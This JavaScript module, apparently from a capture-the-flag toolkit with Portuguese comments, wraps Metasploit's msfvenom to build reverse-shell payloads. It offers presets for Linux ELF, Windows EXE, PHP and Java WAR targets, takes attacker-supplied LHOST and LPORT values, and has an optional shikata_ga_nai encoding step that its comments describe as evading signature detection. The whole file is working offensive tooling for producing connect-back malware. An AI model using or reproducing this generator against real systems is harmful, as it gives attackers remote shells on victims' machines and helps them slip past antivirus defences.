import path from 'path';
import { spawn } from 'node:child_process';
import { mkdir } from 'node:fs/promises';
import { GHOSTCTF_PAYLOADS_DIR } from './payload-kit.js';

/** Timeout para msfvenom (encoding pode demorar). */
const MSFVENOM_TIMEOUT_MS = 180000;

/**
 * Preset → payload Metasploit, formato de saída e extensão do ficheiro.
 * encodable: só presets x86 beneficiam de -e x86/shikata_ga_nai (evasão de assinaturas simples).
 */
const PRESETS = {
  linux_x64_elf: {
    payload: 'linux/x64/shell_reverse_tcp',
    format: 'elf',
    ext: 'elf',
    encodable: false,
  },
  linux_x86_elf: {
    payload: 'linux/x86/shell_reverse_tcp',
    format: 'elf',
    ext: 'elf',
    encodable: true,
  },
  windows_x64_exe: {
    payload: 'windows/x64/shell_reverse_tcp',
    format: 'exe',
    ext: 'exe',
    encodable: false,
  },
  windows_x86_exe: {
    payload: 'windows/shell_reverse_tcp',
    format: 'exe',
    ext: 'exe',
    encodable: true,
  },
  php_raw: { payload: 'php/reverse_php', format: 'raw', ext: 'php', encodable: false },
  java_war: { payload: 'java/shell_reverse_tcp', format: 'war', ext: 'war', encodable: false },
};

const ALLOWED_ENCODERS = new Set(['x86/shikata_ga_nai']);

export const MSFVENOM_WANDENREICH_PRESET_KEYS = Object.keys(PRESETS);

function validateLhost(lhostRaw) {
  const h = String(lhostRaw || '').trim();
  if (!h || h.length > 120 || !/^[a-zA-Z0-9.\-]+$/.test(h)) {
    return { ok: false, error: 'lhost: IPv4 ou hostname (A–Z, 0-9, ., -)' };
  }
  return { ok: true, lhost: h };
}

function safeHost(lhost) {
  return lhost.replace(/[^a-z0-9.-]+/gi, '_');
}

/**
 * @param {{ preset: string, lhost: string, lport: number, encoder?: string, iterations?: number }} opts
 */
export async function runMsfvenomWandenreichBuild(opts) {
  const presetKey = String(opts?.preset || '').trim();
  const p = PRESETS[presetKey];
  if (!p) {
    return {
      ok: false,
      status: 400,
      error: `preset inválido. Use: ${MSFVENOM_WANDENREICH_PRESET_KEYS.join(', ')}`,
    };
  }
  const v = validateLhost(opts?.lhost);
  if (!v.ok) return { ok: false, status: 400, error: v.error };
  const lp = Number(opts?.lport);
  if (!Number.isFinite(lp) || lp < 1 || lp > 65535) {
    return { ok: false, status: 400, error: 'lport: 1–65535' };
  }

  const enc = String(opts?.encoder || '').trim();
  if (enc && !p.encodable) {
    return { ok: false, status: 400, error: 'Encoder só disponível para presets x86 (Linux x86 ELF ou Windows x86 EXE).' };
  }
  if (enc && !ALLOWED_ENCODERS.has(enc)) {
    return { ok: false, status: 400, error: 'encoder não suportado' };
  }

  let it = Math.floor(Number(opts?.iterations));
  if (!Number.isFinite(it) || it < 1) it = 1;
  if (it > 10) it = 10;

  await mkdir(GHOSTCTF_PAYLOADS_DIR, { recursive: true });
  const filename = `msf_${safeHost(v.lhost)}_${lp}.${p.ext}`;
  const outPath = path.join(GHOSTCTF_PAYLOADS_DIR, filename);

  const args = ['-p', p.payload, `LHOST=${v.lhost}`, `LPORT=${lp}`];
  if (enc) {
    args.push('-e', enc, '-i', String(it));
  }
  args.push('-f', p.format, '-o', outPath);

  return new Promise((resolve) => {
    const child = spawn('msfvenom', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderr = '';
    let stdout = '';
    let settled = false;

    const finish = (result) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(result);
    };

    const timer = setTimeout(() => {
      try {
        child.kill('SIGTERM');
      } catch {
        /* */
      }
      finish({ ok: false, status: 504, error: 'msfvenom excedeu o tempo limite (3 min).' });
    }, MSFVENOM_TIMEOUT_MS);

    child.stderr?.on('data', (d) => {
      stderr += d.toString();
    });
    child.stdout?.on('data', (d) => {
      stdout += d.toString();
    });

    child.on('error', (err) => {
      if (err?.code === 'ENOENT') {
        finish({
          ok: false,
          status: 503,
          error: 'msfvenom não está no PATH (Metasploit / Kali).',
        });
        return;
      }
      finish({ ok: false, status: 500, error: err?.message || String(err) });
    });

    child.on('close', (code) => {
      if (settled) return;
      clearTimeout(timer);
      if (code !== 0) {
        const msg = (stderr || stdout).trim() || `msfvenom terminou com código ${code}`;
        finish({ ok: false, status: 500, error: msg });
        return;
      }
      finish({
        ok: true,
        relativePath: path.join('payloads', filename).replace(/\\/g, '/'),
        filename,
        preset: presetKey,
        encoder: enc || null,
        iterations: enc ? it : null,
      });
    });
  });
}
